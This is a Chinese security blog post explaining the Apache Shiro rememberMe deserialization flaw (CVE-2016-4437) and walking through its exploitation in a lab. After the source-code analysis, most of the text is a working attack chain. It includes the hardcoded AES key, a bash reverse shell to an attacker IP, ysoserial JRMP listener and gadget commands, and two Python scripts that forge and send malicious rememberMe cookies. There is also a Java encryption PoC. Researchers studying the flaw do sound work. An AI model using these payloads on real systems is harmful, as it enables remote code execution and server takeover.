<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="Shiro反序列化漏洞"/>








  <link rel="alternate" href="/atom.xml" title="Tomas'Blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="http://yoursite.com/2020/10/27/md文件/shiro_unserialize/"/>


<meta name="description" content="Shiro 反序列化漏洞0X00 Shiro rememberMe(Shiro-550) CVE-2016-4437  影响版本：Apache Shiro &amp;lt; 1.2.4一键利用工具：ShiroExploit漏洞原理 shiro在登录处提供了Remember Me这个功能，来记录用户登录的凭证，然后shiro使用了CookieRememberMeManager类对用户的登陆凭证，也就是Rem">
<meta property="og:type" content="article">
<meta property="og:title" content="Shiro反序列化漏洞">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;10&#x2F;27&#x2F;md%E6%96%87%E4%BB%B6&#x2F;shiro_unserialize&#x2F;index.html">
<meta property="og:site_name" content="Tomas&#39;Blog">
<meta property="og:description" content="Shiro 反序列化漏洞0X00 Shiro rememberMe(Shiro-550) CVE-2016-4437  影响版本：Apache Shiro &amp;lt; 1.2.4一键利用工具：ShiroExploit漏洞原理 shiro在登录处提供了Remember Me这个功能，来记录用户登录的凭证，然后shiro使用了CookieRememberMeManager类对用户的登陆凭证，也就是Rem">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;middleware&#x2F;shiro&#x2F;550-remember-cookie.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;middleware&#x2F;shiro&#x2F;550-aes-key.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;middleware&#x2F;shiro&#x2F;550-burp-dnslog.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;middleware&#x2F;shiro&#x2F;550-java-runtime-bash.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;middleware&#x2F;shiro&#x2F;550-crypto-data.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;middleware&#x2F;shiro&#x2F;550-cookie-payload.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;middleware&#x2F;shiro&#x2F;550-shiro-550-shell.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;middleware&#x2F;shiro&#x2F;550-java-cookie-poc.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;middleware&#x2F;shiro&#x2F;550-burp-cookie-poc-ser.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;middleware&#x2F;shiro&#x2F;550-tmp-succsee.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;middleware&#x2F;shiro&#x2F;721-remember-cookie.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;middleware&#x2F;shiro&#x2F;721-dnslog-payload.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;middleware&#x2F;shiro&#x2F;720-padding-cookie.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;middleware&#x2F;shiro&#x2F;721-burp-rememberMe.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;middleware&#x2F;shiro&#x2F;721-dnslog-result.png">
<meta property="og:updated_time" content="2020-08-26T07:52:27.521Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;middleware&#x2F;shiro&#x2F;550-remember-cookie.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  



    <title> Shiro反序列化漏洞 - Tomas'Blog </title>
  </head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">Tomas'Blog</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          Shiro反序列化漏洞
        
      </h1>

      <time class="post-time">
          10月 27 2020
      </time>
    </header>
    
            <div class="post-content">
            <h2 id="Shiro-反序列化漏洞"><a href="#Shiro-反序列化漏洞" class="headerlink" title="Shiro 反序列化漏洞"></a>Shiro 反序列化漏洞</h2><h3 id="0X00-Shiro-rememberMe-Shiro-550"><a href="#0X00-Shiro-rememberMe-Shiro-550" class="headerlink" title="0X00 Shiro rememberMe(Shiro-550)"></a>0X00 Shiro rememberMe(Shiro-550)</h3><blockquote>
<p>CVE-2016-4437</p>
</blockquote>
<h5 id="影响版本：Apache-Shiro-lt-1-2-4"><a href="#影响版本：Apache-Shiro-lt-1-2-4" class="headerlink" title="影响版本：Apache Shiro &lt; 1.2.4"></a>影响版本：Apache Shiro &lt; 1.2.4</h5><h5 id="一键利用工具：ShiroExploit"><a href="#一键利用工具：ShiroExploit" class="headerlink" title="一键利用工具：ShiroExploit"></a>一键利用工具：<a href="https://github.com/feihong-cs/ShiroExploit" target="_blank" rel="noopener">ShiroExploit</a></h5><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><ul>
<li>shiro在登录处提供了Remember Me这个功能，来记录用户登录的凭证，然后shiro使用了CookieRememberMeManager类对用户的登陆凭证，也就是Remember Me的内容进行一系列处理：</li>
</ul>
<p><strong>使用Java序列化 —&gt; 使用密钥进行AES加密 —&gt; Base64加密 —&gt; 得到加密后的Remember Me内容</strong></p>
<ul>
<li>同时在识别用户身份的时候，需要对Remember Me的字段进行解密，解密的顺序为：</li>
</ul>
<p><strong>Remember Me加密内容 —&gt; Base64解密 —&gt; 使用密钥进行AES解密 —&gt;Java反序列化</strong></p>
<ul>
<li>▲ 问题出在<strong>AES加密的密钥Key被硬编码在代码里</strong>，这意味着攻击者只要通过源代码找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化，AES加密，Base64编码，然后将其作为cookie的Remember Me字段发送，Shiro将RememberMe进行解密并且反序列化，最终造成反序列化漏洞</li>
</ul>
<h5 id="漏洞加密分析"><a href="#漏洞加密分析" class="headerlink" title="漏洞加密分析"></a>漏洞加密分析</h5><ul>
<li>登录<a href="http://localhost:8080/login.jsp" target="_blank" rel="noopener">http://localhost:8080/login.jsp</a> ，勾选rememberMe，登录成功后会看到一个key为rememberMe，value长度为512的Cookie</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rememberMe=WM0+3iRZaxl/mYdNM2vyqOvxRiJfMtqkfv2mJX6cLUZQFRnWcS5jVR+e43SeN+yeBoWiVDjFBDSNp5+YGf9y1av27VuG8bYwTOaHkFVkoeFKpJadtV0tAGxcpI9e4il6D9OHH6k7PcJCdtaUnLPGwqnRGGHZjD1M/ZM8KSawiHAfme9rKC0pxijJoMIaz9jSEaOmJnXDzBIAgnSkikJD9s5LO3fpNMHuaHCC8Hqcrna8vn5sEKD1jIlGxugTFWoyMeYQzVvIxhZbs8v5mJfTXFRSVmfH9FrotQqKCJLD3V8WFckEZdMQIYvozXuym1LGix0QaP9F7sjoCvNt953nwYiJHGoiOwpP/V2LjLY60usnFP+Qu+FKRYIjUrcCT6NyasQL4ehTpUZ3uoxp9NYy5sv/MsW5g335odrtzA03LOM0ZDXqHS/aAuPpO74RmN3K7aq3dzOpQrEY7CTfkKLbQjA3Iz9fzSYgxlq7UoXjkp5/E1cr7KRlLqv8Edr9uU0lWb5XU2Thp+mA4RlRbYetAg==</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/550-remember-cookie.png" alt="550-remember-cookie"></p>
<ul>
<li><p>假设以admin用户登录，登录成功的情况下，shiro会先将admin字符串进行序列化，使用DefaultSerializer类的serialize类的serizlize方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = serialize(principals); <span class="comment">// 进行序列化</span></span><br><span class="line">        <span class="keyword">if</span> (getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            bytes = encrypt(bytes); <span class="comment">// AES加密</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>处理Cookie的类  -&gt;  CookieRememberMeManaer</p>
<ul>
<li>继承AbstractRememberMeManager类</li>
</ul>
</li>
<li><p>跟进AbstractRememberMeManager类  -&gt; 从onSuccessfulLogin方法下断点，debug就可以看到逻辑</p>
<ul>
<li>很容易看到AES的Key</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>encrypt方法中，AES的模式为AES/CBC/PKCS5Padding，并且并且AES的key为    <code>Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)</code>，转换为16进制后是<code>\x90\xf1\xfe\x6c\x8c\x64\xe4\x3d\x9d\x79\x98\x88\xc5\xc6\x9a\x68</code>，key为16字节，128位</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] encrypt(<span class="keyword">byte</span>[] serialized) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] value = serialized;</span><br><span class="line">        CipherService cipherService = getCipherService();</span><br><span class="line">        <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey());</span><br><span class="line">            value = byteSource.getBytes();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>进行AES加密，利用arraycopy()方法将随机的16字节IV放到序列化后的数据前面，完成后再进行AES加密。最后在CookieRememberMeManager类的rememberSerializedIdentity()方法中进行base64加密</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String base64 = Base64.encodeToString(serialized);</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h5 id="漏洞解析分析"><a href="#漏洞解析分析" class="headerlink" title="漏洞解析分析"></a>漏洞解析分析</h5><ul>
<li>通过AES的key，加密模式AES/CBC/PKCS5Padding  -&gt;  加解密密文</li>
<li>获取remmemberMe的Cookie</li>
<li>Base64解码，CookieRememberMeManager类的getRememberedSerializedIdentity()方法</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] decoded = Base64.decode(base64);</span><br></pre></td></tr></table></figure>

<ul>
<li>AES解密，Base64解码后的字节，减去前面16个字节，使用AbstractRememberMeManager类的decrypt()方法</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">protected byte[] decrypt(byte[] encrypted) &#123;</span><br><span class="line">        byte[] serialized = encrypted;</span><br><span class="line">        CipherService cipherService = getCipherService();</span><br><span class="line">        if (cipherService != null) &#123;</span><br><span class="line">            ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">            serialized = byteSource.getBytes();</span><br><span class="line">        &#125;</span><br><span class="line">        return serialized;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>反序列化，使用DefaultSerializer类的deserialize()方法</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public T deserialize(byte[] serialized) throws SerializationException &#123;</span><br><span class="line">        if (serialized == null) &#123;</span><br><span class="line">            String msg = &quot;argument cannot be null.&quot;;</span><br><span class="line">            throw new IllegalArgumentException(msg);</span><br><span class="line">        &#125;</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(serialized);</span><br><span class="line">        BufferedInputStream bis = new BufferedInputStream(bais);</span><br><span class="line">        try &#123;</span><br><span class="line">            ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);</span><br><span class="line">            @SuppressWarnings(&#123;&quot;unchecked&quot;&#125;)</span><br><span class="line">            T deserialized = (T) ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">            return deserialized;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            String msg = &quot;Unable to deserialze argument byte array.&quot;;</span><br><span class="line">            throw new SerializationException(msg, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>▲ readObjetc方法，由于反序列化的对象完全由外部rememberMe Cookie控制。所以，一旦添加了有漏洞的包或者库如common-collections包，就会造成任意命令执行</li>
</ul>
<h5 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h5><ul>
<li><a href="https://github.com/frohoff/ysoserial.git" target="_blank" rel="noopener">ysoserial</a></li>
<li><a href="https://github.com/insightglacier/Shiro_exploit" target="_blank" rel="noopener">Shiro_exploit</a>_</li>
</ul>
<h5 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><ul>
<li>检测是否存在默认的key，使用Shiro_exploit来获取key</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py -u http://you_ip:8080</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/550-aes-key.png" alt="550-aes-key"></p>
<ul>
<li><p>可通过Burpsuite的Burp Collaborator Client进行DNSlog测试(默认会有TTL缓存机制，默认10s)</p>
<ul>
<li>先生成一个Payload，Copy to clipboar进行复制</li>
<li>通过shiro.py脚本进行生成需要的payload</li>
<li>放入Cookie中进行重放  -&gt;  可以发现回包有两个Remember=DeleteMe</li>
<li>在Burp Collaborator Client中点击Poll now查看是否有回显信息</li>
<li>▲ 这里因为脚本的原因，暂无法编译出payload，借用一些大佬的图片</li>
</ul>
<p><img src="/images/middleware/shiro/550-burp-dnslog.png" alt="550-burp-dnslog"></p>
</li>
</ul>
<h5 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h5><ul>
<li>首先通过shiro_exp_payload.py生成的payload访问攻击端口6666</li>
<li>端口6666攻击机通过CommonsCollections5执行系统命令反弹shell给需要反弹的机器（这里还是攻击机不过端口是9999）</li>
</ul>
<h5 id="漏洞利用一"><a href="#漏洞利用一" class="headerlink" title="漏洞利用一"></a>漏洞利用一</h5><ul>
<li><p>制作反弹shell</p>
<ul>
<li><p>监听本地端口<code>nc -nvlp 9999</code></p>
</li>
<li><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">Java Runtime</a> 配合bash编码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.71.47/9999 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjcxLjQ3Lzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/550-java-runtime-bash.png" alt="550-java-runtime-bash"></p>
</li>
</ul>
</li>
<li><p>通过ysoserial的JRMP监听模块，监听6666端口并执行反弹shell命令</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &apos;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjcxLjQ3Lzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&apos;</span><br><span class="line"></span><br><span class="line">▲ Window下单引号需改为双引号，不然会报错</span><br></pre></td></tr></table></figure>

<ul>
<li>使用shiro.py生成payload（借用大佬的shiro.py脚本）</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial-0.0.6-SNAPSHOT-all.jar'</span>, <span class="string">'JRMPClient'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>)</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])   </span><br><span class="line"><span class="keyword">print</span> <span class="string">"rememberMe=&#123;0&#125;"</span>.format(payload.decode())</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python shiro.py 192.168.71.47:6666</span><br><span class="line"></span><br><span class="line">Payload:rememberMe=uCkSNSu3SJ65fQlfsjIhZ3Jsa+mLKp0grAJZik4iZm4aeWC48j5RFAZBDlFXEwHum5AHRr3n0JeI+QyUwYwjbXv3iA5zw8D9Ny6PWcndXnQa1+eDxaiEpGtYuRw92gd6MQeHTqh34/tOM0GLYcgzltFikbLgmA2y0SED1Bsz4UsCWn846cWh37JcRk2V+zMB1m8hdSxhtv3mqtuyRoFntAiHmMV8T1LHZd7JBfjZz0+uSol36u6lO6ZZdDIHcqishUTxxeiOlSUcqnbWNKI2nveEyxVNQKJ9gXyAI93zvANYHFI6UTAoYoPLIkViaB0H1Y20JEhZ7knsCEjd8zrezo7xUjPZzh9ZRB6ZR+67b5O2JH/T9rjRh+3vX6HznQZ17YtLON1EMoByXdyoR/pP9Q==</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/550-crypto-data.png" alt="550-crypto-data"></p>
<ul>
<li>构造数据包，伪造cookie，发送Payload</li>
</ul>
<p><img src="/images/middleware/shiro/550-cookie-payload.png" alt="550-cookie-payload"></p>
<ul>
<li>nc监听，反弹拿到shell</li>
</ul>
<p><img src="/images/middleware/shiro/550-shiro-550-shell.png" alt="550-shiro-550-shell"></p>
<ul>
<li>补充，另一个大佬的脚本，一样的原理</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line">import uuid</span><br><span class="line">import subprocess</span><br><span class="line">import requests</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">JAR_FILE = &apos;/Users/Viarus/Downloads/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def poc(url, rce_command):</span><br><span class="line">    if &apos;://&apos; not in url:</span><br><span class="line">        target = &apos;https://%s&apos; % url if &apos;:443&apos; in url else &apos;http://%s&apos; % url</span><br><span class="line">    else:</span><br><span class="line">        target = url</span><br><span class="line">    try:</span><br><span class="line">        payload = generator(rce_command, JAR_FILE)  # 生成payload</span><br><span class="line">        r = requests.get(target, cookies=&#123;&apos;rememberMe&apos;: payload.decode()&#125;, timeout=10)  # 发送验证请求</span><br><span class="line">        print r.text</span><br><span class="line">    except Exception, e:</span><br><span class="line">        pass</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def generator(command, fp):</span><br><span class="line">    if not os.path.exists(fp):</span><br><span class="line">        raise Exception(&apos;jar file not found!&apos;)</span><br><span class="line">    popen = subprocess.Popen([&apos;java&apos;, &apos;-jar&apos;, fp, &apos;CommonsCollections2&apos;, command],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    poc(&apos;http://127.0.0.1:8080&apos;, &apos;open /Applications/Calculator.app&apos;)</span><br></pre></td></tr></table></figure>

<h5 id="漏洞利用二"><a href="#漏洞利用二" class="headerlink" title="漏洞利用二"></a>漏洞利用二</h5><ul>
<li>生成poc.ser文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 <span class="string">"touch /tmp/success"</span> &gt; poc.ser</span><br></pre></td></tr></table></figure>

<ul>
<li>使用之前的AES密钥对Payload进行加密，使用Java的POC</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> shiro;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.CodecSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.io.DefaultSerializer;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestRemember</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">"d://poc.ser"</span>));</span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>));</span><br><span class="line"></span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>编译生成最后的RememberMe，需要shiro-core的jar包以及slf4j-api的包</li>
</ul>
